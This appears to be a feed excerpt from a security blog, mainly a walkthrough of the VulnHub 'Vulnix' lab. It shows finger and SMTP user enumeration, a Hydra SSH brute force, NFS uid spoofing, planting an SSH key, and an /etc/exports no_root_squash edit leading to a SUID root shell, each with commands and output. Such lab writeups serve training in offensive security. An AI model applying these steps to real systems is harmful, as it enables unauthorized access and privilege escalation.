Accepted  TLSv1.2  112 bits  DES-CBC3-SHA               <br/>
Preferred TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  128 bits  AES128-SHA                 <br/>
Accepted  TLSv1.1  256 bits  AES256-SHA                 <br/>
Accepted  TLSv1.1  112 bits  DES-CBC3-SHA               <br/>
Preferred TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  128 bits  AES128-SHA                 <br/>
Accepted  TLSv1.0  256 bits  AES256-SHA                 <br/>
Accepted  TLSv1.0  112 bits  DES-CBC3-SHA</p>

<p>  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048</p>

<p>Subject:  <em>.cylance.com
Altnames: DNS:</em>.cylance.com, DNS:cylance.com, DNS:www.cylance.com, DNS:info.cylance.com, DNS:blog.cylance.com, DNS:education.cylance.com, DNS:support.cylance.com
Issuer:   DigiCert SHA2 Secure Server CA</p>

<p>Not valid before: May 24 00:00:00 2017 GMT
Not valid after:  May 29 12:00:00 2018 GMT
```</p>

<p>```</p>

<hr />

<p>/ Q: Do you know what the death rate \
\ around here is? A: One per person. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackLAB Vulnix]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix/"/>
    <updated>2017-06-20T08:04:29-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix</id>
    <content type="html"><![CDATA[<p>Vulnix is an older machine from VulnHub that intends to present vulnerabilities from a misconfiguration point of view. The goal is to get the flag inside /root</p>

<!-- more -->


<p>Here are the Nmap results:</p>

<p><code>
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
79/tcp    open  finger     Linux fingerd
110/tcp   open  pop3?
111/tcp   open  rpcbind    2-4 (RPC #100000)
143/tcp   open  imap       Dovecot imapd
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imap   Dovecot imapd
995/tcp   open  ssl/pop3s?
2049/tcp  open  nfs_acl    2-3 (RPC #100227)
36190/tcp open  status     1 (RPC #100024)
40731/tcp open  mountd     1-3 (RPC #100005)
43539/tcp open  nlockmgr   1-4 (RPC #100021)
46423/tcp open  mountd     1-3 (RPC #100005)
52024/tcp open  mountd     1-3 (RPC #100005)
</code></p>

<h3>finger user enumeration</h3>

<p>There are quite a few services listening on the host. One of the first things that grabbed my attention was finger running on port 79. Because of this, we can use finger to perform <a href="https://pentestlab.blog/tag/finger/">user enumeration</a> on the host. We can use Nmap&rsquo;s script scan to see who is logged on the host, or do it manually. Here I will show the manual way:</p>

<p><code>
finger @192.168.217.142
No one logged on.
</code></p>

<p>The same thing can be achieved by running Nmap with the <em>-sC</em> flag. Next I tried to get more information about the root user:</p>

<p><code>
finger root@192.168.217.142
Login: root                     Name: root
Directory: /root                        Shell: /bin/bash
Never logged in.
No mail.
No Plan.
</code></p>

<p>It seems the root user never logged in, but we still obtained the directory and shell that root uses. I tried a few more guesses and discovered a couple more users on the host:</p>

<p>```
finger <a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#117;&#115;&#x65;&#114;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x32;&#49;&#x37;&#x2e;&#49;&#52;&#50;">&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#50;&#49;&#x37;&#46;&#x31;&#x34;&#x32;</a>
Login: user                     Name: user
Directory: /home/user                   Shell: /bin/bash
Never logged in.
No mail.
No Plan.</p>

<p>Login: dovenull                 Name: Dovecot login user
Directory: /nonexistent                 Shell: /bin/false
Never logged in.
No mail.
No Plan.</p>

<p>finger <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#118;&#x75;&#108;&#110;&#105;&#x78;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#50;&#49;&#55;&#x2e;&#49;&#52;&#50;">&#x76;&#117;&#x6c;&#x6e;&#105;&#x78;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#50;&#49;&#55;&#46;&#x31;&#52;&#50;</a>
Login: vulnix                   Name:
Directory: /home/vulnix                 Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```</p>

<h3>SMTP user enumeration</h3>

<p>Since port 25 is open, we can also attempt some enumeration with SMTP. Again, this can be accomplished with an Nmap script, but this time I want to use an utility called <strong>smtp-user-enum</strong>.</p>

<p>Homepage: <a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum">http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</a></p>

<blockquote><p>smtp-user-enum is a tool for enumerating OS-level user accounts on Solaris via the SMTP service (sendmail).
Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands. It could be adapted to
work against other vulnerable SMTP daemons, but this hasn’t been done as of v1.0.</p></blockquote>

<p>Let&rsquo;s see its options:</p>

<p>```
smtp-user-enum v1.2 ( <a href="http://pentestmonkey.net/tools/smtp-user-enum">http://pentestmonkey.net/tools/smtp-user-enum</a> )</p>

<p>Usage: smtp-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )</p>

<p>options are:</p>

<pre><code>    -m n     Maximum number of processes (default: 5)
-M mode  Method to use for username guessing EXPN, VRFY or RCPT (default: VRFY)
-u user  Check if user exists on remote system
-f addr  MAIL FROM email address.  Used only in "RCPT TO" mode (default: user@example.com)
    -D dom   Domain to append to supplied user list to make email addresses (Default: none)
             Use this option when you want to guess valid email addresses instead of just usernames
             e.g. "-D example.com" would guess foo@example.com, bar@example.com, etc.  Instead of 
                  simply the usernames foo and bar.
-U file  File of usernames to check via smtp service
-t host  Server host running smtp service
-T file  File of hostnames running the smtp service
-p port  TCP port on which smtp service runs (default: 25)
-d       Debugging output
-t n     Wait a maximum of n seconds for reply (default: 5)
-v       Verbose
-h       This help message
</code></pre>

<p>Also see smtp-user-enum-user-docs.pdf from the smtp-user-enum tar ball.</p>

<p>Examples:</p>

<p>$ smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.1
$ smtp-user-enum.pl -M EXPN -u admin1 -t 10.0.0.1
$ smtp-user-enum.pl -M RCPT -U users.txt -T mail-server-ips.txt
$ smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1
```</p>

<p>I created a file named users.txt with some usernames to try, and fed it to the script:</p>

<p>```
root@kali:~# smtp-user-enum -U users.txt -t 192.168.217.142
Starting smtp-user-enum v1.2 ( <a href="http://pentestmonkey.net/tools/smtp-user-enum">http://pentestmonkey.net/tools/smtp-user-enum</a> )</p>

<hr />



<hr />

<p>Mode &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip; VRFY
Worker Processes &hellip;&hellip;&hellip; 5
Usernames file &hellip;&hellip;&hellip;.. users.txt
Target count &hellip;&hellip;&hellip;&hellip;. 1
Username count &hellip;&hellip;&hellip;.. 6
Target TCP port &hellip;&hellip;&hellip;. 25
Query timeout &hellip;&hellip;&hellip;&hellip; 5 secs
Target domain &hellip;&hellip;&hellip;&hellip;</p>

<h6>## Scan started at Tue Jun 20 09:29:30 2017</h6>

<p>192.168.217.142: root exists
192.168.217.142: vulnix exists
192.168.217.142: user exists
192.168.217.142: postmaster exists
192.168.217.142: mail exists</p>

<h6>## Scan completed at Tue Jun 20 09:29:30 2017</h6>

<p>5 results.</p>

<p>6 queries in 1 seconds (6.0 queries / sec)
```</p>

<p>You can see that this is a pretty cool script that can help you enumerate users pretty fast, and now we know more valid user accounts on the system. You can also use it to find valid email addresses instead of accounts, by using the <em>-D</em> option. I tried a few examples, but got no hits.</p>

<p>Moving on, ports 512-514 are fore the old r-utilities, and if misconfigured, could allow remote access to the host. But in this case, the system asked me for root&rsquo;s SSH password, so I couldn&rsquo;t exploit them.</p>

<h3>Exploit NFS</h3>

<p>We&rsquo;ve done some preliminary enumeration on the target, now it&rsquo;s time to return to the results of the Nmap scan. We&rsquo;ve identified the fact that NFS is running on the Vulnix host. I confirmed it with the use of <em>rpcinfo</em>:</p>

<p>```
rpcinfo -p 192.168.217.142
   program vers proto   port  service</p>

<pre><code>100000    4   tcp    111  portmapper
100000    3   tcp    111  portmapper
100000    2   tcp    111  portmapper
100000    4   udp    111  portmapper
100000    3   udp    111  portmapper
100000    2   udp    111  portmapper
100024    1   udp  39427  status
100024    1   tcp  42309  status
100003    2   tcp   2049  nfs
100003    3   tcp   2049  nfs
100003    4   tcp   2049  nfs
100227    2   tcp   2049
100227    3   tcp   2049
100003    2   udp   2049  nfs
100003    3   udp   2049  nfs
100003    4   udp   2049  nfs
100227    2   udp   2049
100227    3   udp   2049
100021    1   udp  39258  nlockmgr
100021    3   udp  39258  nlockmgr
100021    4   udp  39258  nlockmgr
100021    1   tcp  34418  nlockmgr
100021    3   tcp  34418  nlockmgr
100021    4   tcp  34418  nlockmgr
100005    1   udp  34638  mountd
100005    1   tcp  52581  mountd
100005    2   udp  42603  mountd
100005    2   tcp  53226  mountd
100005    3   udp  49704  mountd
100005    3   tcp  47770  mountd
</code></pre>

<p>```</p>

<p>If NFS wasn&rsquo;t properly configured, we might have access to shares we wouldn&rsquo;t otherwise be allowed to. There are a couple of ways to list the shares, and I&rsquo;m going to show here some of them. Th easiest way is from the command line, with the <code>showmount -e</code> command:</p>

<p><code>
root@kali:~# showmount -e 192.168.217.142
Export list for 192.168.217.142:
/home/vulnix *
</code></p>

<p>Good news! The vulnix home directory is being shared with no restrictions. Before going there, let&rsquo;s see how we can get the same information with Nmap:</p>

<p>```
nmap -sV -p111 &mdash;script=nfs-showmount 192.168.217.142</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-06-21 06:00 EDT
Nmap scan report for 192.168.217.142
Host is up (0.00027s latency).
PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| nfs-showmount:
|<em>  /home/vulnix *
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      47770/tcp  mountd
|   100005  1,2,3      49704/udp  mountd
|   100021  1,3,4      34418/tcp  nlockmgr
|   100021  1,3,4      39258/udp  nlockmgr
|   100024  1          39427/udp  status
|   100024  1          42309/tcp  status
|   100227  2,3         2049/tcp  nfs_acl
|</em>  100227  2,3         2049/udp  nfs_acl
```</p>

<p>We can also use the <em>auxiliary/scanner/nfs/nfsmount</em> Metasploit module:</p>

<p>```
msf auxiliary(nfsmount) > run</p>

<p>[+] 192.168.217.142:111   &ndash; 192.168.217.142 NFS Export: /home/vulnix [<em>]
[</em>] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```</p>

<p>I mounted the share locally to see what&rsquo;s there. The <em>nolock</em> option disables file locking and it&rsquo;s sometimes required for older NFS servers.</p>

<p><code>
root@kali:/mnt# mkdir nfs
root@kali:/mnt# mount -t nfs -o nolock 192.168.217.142:/home/vulnix /mnt/nfs
</code></p>

<p>However, when I tried to access the newly mounted share, I got permission denied errors. I couldn&rsquo;t <em>chmod</em> or do anything else. After some reading on the interwebz, it seems the likely cause is the <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html">root_squash</a> option, that nullifies the root privileges of the clients accessing the share, and instead gives them the user ID of the nobody user. It seems to be enabled by default on modern NFS implementations, and you can read more about it <a href="http://www.techrepublic.com/article/working-with-nfs/">here</a>.</p>

<p>After some more digging through the interwebz, I found an <a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">interesting article about nfsshell</a>, which is a userspace NFS client shell. I downloaded it from its <a href="https://github.com/NetDirect/nfsshell">Github page</a>, and to compile I had to install the following <a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">dependencies</a>: <code>apt-get install libreadline-dev libncurses5-dev</code>. Afterwards, I ran <em>make</em> and it compiled fine. Here are its options:</p>

<p><code>
nfs&gt; help
host &lt;host&gt; - set remote host name
uid [&lt;uid&gt; [&lt;secret-key&gt;]] - set remote user id
gid [&lt;gid&gt;] - set remote group id
cd [&lt;path&gt;] - change remote working directory
lcd [&lt;path&gt;] - change local working directory
cat &lt;filespec&gt; - display remote file
ls [-l] &lt;filespec&gt; - list remote directory
get &lt;filespec&gt; - get remote files
df - file system information
rm &lt;file&gt; - delete remote file
ln &lt;file1&gt; &lt;file2&gt; - link file
mv &lt;file1&gt; &lt;file2&gt; - move file
mkdir &lt;dir&gt; - make remote directory
rmdir &lt;dir&gt; - remove remote directory
chmod &lt;mode&gt; &lt;file&gt; - change mode
chown &lt;uid&gt;[.&lt;gid&gt;] &lt;file&gt; -  change owner
put &lt;local-file&gt; [&lt;remote-file&gt;] - put file
mount [-upTU] [-P port] &lt;path&gt; - mount file system
umount - umount remote file system
umountall - umount all remote file systems
export - show all exported file systems
dump - show all remote mounted file systems
status - general status report
help - this help message
quit - its all in the name
bye - good bye
handle [&lt;handle&gt;] - get/set directory file handle
mknod &lt;name&gt; [b/c major minor] [p] - make device
</code></p>

<p>From my reading about NFS and root squashing, it seems that knowing the uid of the share&rsquo;s owner would allow mounting the share as that user and bypassing the access denied errors that I got as root. Because the share is the home folder of the vulnix user, we need to know the uid for that particular user account. But we need local access to the machine to find that out. Well, we did get some usernames from the enumeration stage, so we probably have to attempt a bruteforce attack. From all the discovered usernames, I only kept the user and vulnix ones, because the rest were users for various services on the system. And then I ran Hydra with the recommended task number for SSH:</p>

<p><img class="center" src="/images/pentest/vulnix-hydra.png" title="&lsquo;hydra&rsquo; &lsquo;letmein&rsquo;" ></p>

<p>Hydra found the password for user pretty quickly. I logged in as user, but didn&rsquo;t find anything out of the ordinary. However, I was able to get the uid for the vulnix account:</p>

<p><code>
user@vulnix:~$ id vulnix
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
</code></p>

<p>I went back to nfsshell and made the changes:</p>

<p><code>
nfs&gt; host 192.168.217.142
Using a privileged port (1023)
Open 192.168.217.142 (192.168.217.142) TCP
nfs&gt; uid 2008
nfs&gt; gid 2008
nfs&gt; status
User id      : 2008
Group id     : 2008
Remote host  : `192.168.217.142'
Transfer size: 0
</code></p>

<p>Now I was able to access the share:</p>

<p><code>
nfs&gt; ls -l
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .
drwxr-x---  2     2008  2008      4096  Sep  2  2012  ..
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bash_logout
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bashrc
drwxr-x---  2     2008  2008      4096  Sep  2  2012  .profile
</code></p>

<p>Since this is vulnix&rsquo;s home directory, we can put an SSH key in here to allow remote access. I tried the next steps through nfsshell, but I was limited in the commands I could run. So I created a local vulnix user on my machine, and assigned it the uid 2008: <code>root@kali:~# useradd vulnix -u 2008</code>. Then I generated an SSH key pair from this account:</p>

<p><code>
root@kali:~# su vulnix
$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
$ cd /tmp
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): vulnix
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in vulnix.
Your public key has been saved in vulnix.pub.
The key fingerprint is:
SHA256:P6FAPt9R/0TbOTtQUhk8SiBUlgAtINciO0mUmr2Nrp4 vulnix@kali
The key's randomart image is:
+---[RSA 2048]----+
|  .o.oo.++o+o .oo|
|   +o. o .o. ..+ |
|  = + o .   o...o|
| o = o     . oo.+|
|    = + S o  ..+o|
|   o . + + o  .oo|
|  .     o +    o.|
|  ..       .    .|
|.E.              |
+----[SHA256]-----+
</code></p>

<p>I now navigated without problems to the NFS share, created a .ssh directory and copied the contents of the public key to <em>authorized_keys</em>:</p>

<p><code>
$ cat /tmp/vulnix.pub &gt; .ssh/authorized_keys
$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuO5LOA1EIJeaFJHHic7NRNIUvOhBApq7CSu7PAM/THU4hngoZ4kglgFC9QdbsfQsRWLHsDmNcAAGLzIKwkLYXWYanBK/7xdmRmtGf0Sr32zZ4NaXP9B228fjUu5LSi42X/9HcfL9QdfXuB336OvXo43sDzLifrzoiBzlviZV55+uVd+/hI0GCRE3Yi9JrLs1A6NhuHq8xtRLJURhuGwoouA2tGZ+6fSr7t23bC1emBnyUiy2hu/4oS9tLvvptPv1Md9E+Ire6XMjZzCJufcSqiMVrVefnWv5j460TjHhKP7aq23nbzlxMqkZ8r9ovm5KW0UWWWyVPkOFSxPgFEaRr vulnix@kali
</code></p>

<p>And I was able to login with the key: <code>ssh -i /tmp/vulnix <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#58;&#x76;&#117;&#108;&#x6e;&#105;&#x78;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#50;&#49;&#x37;&#x2e;&#49;&#52;&#50;">&#118;&#117;&#108;&#110;&#x69;&#x78;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#50;&#x31;&#x37;&#46;&#x31;&#52;&#50;</a></code>. After some enumeration, I discovered that the vulnix user can edit <code>/etc/exports</code> with sudo privileges:</p>

<p>```
vulnix@vulnix:~$ sudo -l
Matching &lsquo;Defaults&rsquo; entries for vulnix on this host:</p>

<pre><code>env_reset,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User vulnix may run the following commands on this host:</p>

<pre><code>(root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
</code></pre>

<p>```</p>

<p>This is wonderful news. First of all, we need to disable <em>root_squash</em>. Then we can mount the root directory and read the flag, or we can leave a shell binary in vulnix&rsquo;s home directory, and run it later with root privileges. Let&rsquo;s do just that! I disabled root squashing with <code>/home/vulnix    *(rw,no_root_squash)</code>. Then I copied the bash executable:</p>

<p><code>
vulnix@vulnix:~$ cp /bin/bash /home/vulnix/
vulnix@vulnix:~$ ls -l
total 900
-rwxr-xr-x 1 vulnix vulnix 920788 Jun 21 14:46 bash
</code></p>

<p>For the NFS configuration changes to take effect, I needed to make the NFS service to reload its configuration file or restart it, but I didn&rsquo;t have permissions to do that. So I rebooted the machine (but unmounted the share first). After rebooting, I mounted the share again, navigated to it as root with no problems, and changed permissions on the bash shell to make it SUID: <code>chmod 4777 bash</code> (I also copied it again as root).</p>

<p>From the SSH, I verified it as the vulnix user:</p>

<p><code>
vulnix@vulnix:~$ ls -l bash
-rwsrwxrwx 1 root root 920788 Jun 21 15:34 bash
</code></p>

<p>Finally, I ran the shell while preserving its permissions:</p>

<p><code>
vulnix@vulnix:~$ ./bash -p
bash-4.2# whoami
root
bash-4.2# cat /root/trophy.txt
cc614640424f5bd60ce5d5264899c3be
</code></p>

<p>Not done yet, I cracked the MD5 hash to reveal the name of the l33t name of the author: Reb00tu53r. This was a fun one!</p>

<p><strong>Learn more</strong></p>

<ul>
<li><p><a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">NFSShell on Kali Linux</a></p></li>
<li><p><a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">Using nfsshell to compromise older environments</a></p></li>
<li><p><a href="http://www.techrepublic.com/article/working-with-nfs/">Working with NFS</a></p></li>
</ul>


<p>```</p>

<hr />

<p>/ Q: What do you call a half-dozen    \
| Indians with Asian flu? A: Six sick |
\ Sikhs (sic).                        /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
